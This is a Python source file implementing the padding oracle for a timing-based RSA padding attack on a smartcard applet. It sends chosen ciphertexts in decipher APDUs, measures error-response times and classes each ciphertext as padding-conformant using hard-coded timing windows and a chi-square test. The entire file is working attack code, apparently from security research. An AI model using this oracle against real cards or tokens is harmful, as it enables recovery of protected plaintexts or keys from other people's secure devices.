from smartcard.sw.SWExceptions import SWException
from .helpers import *
from scipy.stats import chisquare


class RSAOracle(object):
	def __init__(self, attacker, aid, sample_size=3):
		self.attacker = attacker
		self.aid = aid
		self.nb_queries = 0
		self.sample_size = sample_size

		# Initialize expected distribution with previously collected data. Since To major pike appear in each case,
		# we consider two different distribution. To begin with, valid_high is equal to valid_low, we make a difference
		# only after the first range reduction.
		self.dist_valid = self.get_distribution("_data/time distribution/invalid_padding.txt")
		self.dist_invalid = self.get_distribution("_data/time distribution/invalid_padding.txt")

		# Bounds under and over from which we can guess validity of a candidate (invalid and valid respectively)
		self.bound_l = 270.0
		self.bound_h = 332.0

	def get_distribution(self, f_name):
		dct = {}
		# Compute the frequency of all value in the given file
		with open(f_name, 'r') as f:
			for val in f:
				x = round(float(val), 1)
				if not dct.get(x):
					dct[x] = 0
				dct[x] += 1

		# Return the sample_size most frequent values
		return sorted(dct, key=dct.__getitem__)[-self.sample_size:]

	def check_valid_values(self, sample):
		count = 0
		for x in sample:
			if 273.0 < x < 292.0 or 303 < x < 323 or x > 332:
				count += 1
		return count > self.sample_size / 2

	def check_invalid_values(self, sample):
		count = 0
		for x in sample:
			if x < 273.0 or 295 < x < 301 or 324 < x < 332:
				count += 1
		return count > self.sample_size / 2

	def oracle_query(self, ct):
		sample = []
		while len(sample) < self.sample_size:
			# Select the applet and initiate the session to the point we can
			# access the padding oracle
			self.attacker.select(self.aid)
			self.attacker.manage_security_env()
			self.attacker.check_card_certificate(ignore=True)
			self.nb_queries += 1
			# Send a ciphertext in a PERFORM SECURITY OPERATION - decipher APDU
			try:
				tic = time.time_ns()
				self.attacker.send_encrypted_crt(data=ct)
				# If there is no exception, it is conform
				return True
			except SWException:
				toc = (time.time_ns() - tic) / 1000000
				if toc > 500:
					continue
				sample.append(toc)
				# Some threshold allow to categorize easily
				if toc < self.bound_l or toc > self.bound_h:
					break

		if min(sample) < self.bound_l:
			conform = False
		elif max(sample) > self.bound_h:
			conform = True
		else:
			if self.check_invalid_values(sample):
				conform = False
			elif self.check_valid_values(sample):
				conform = True
			else:
				# Run khi2 test on the sample to find the most probable distribution of the collected sample
				valid_chi = chisquare(sample, f_exp=self.dist_valid[:len(sample)])[1]
				invalid_chi = chisquare(sample, f_exp=self.dist_invalid[:len(sample)])[1]
				conform = valid_chi > invalid_chi

		return conform
